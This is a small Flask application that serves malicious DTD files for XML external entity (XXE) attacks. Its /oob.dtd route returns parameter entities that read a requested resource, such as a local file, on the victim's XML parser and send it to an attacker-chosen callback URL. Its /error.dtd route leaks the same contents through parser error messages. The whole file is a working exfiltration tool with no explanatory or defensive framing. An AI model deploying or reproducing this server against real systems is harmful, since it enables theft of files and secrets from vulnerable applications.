from flask import Flask, abort, request, Response

app = Flask(__name__)

callback = ""

@app.route("/oob.dtd", methods=["GET"])
def oob():
    global callback
    if request.args.get('resource'):
        if request.args.get('callback'):
            callback = request.args.get('callback')

        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource') + '"><!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM \'' + callback + '/?x=%ext;\'>">%eval;%oob;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="Missing external entity parameter 'resource'.")

@app.route("/error.dtd", methods=["GET"])
def error():
    if request.args.get('resource'):
        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource') + '"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%ext;\'>">%eval;%error;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="Missing external entity parameter 'resource'.")
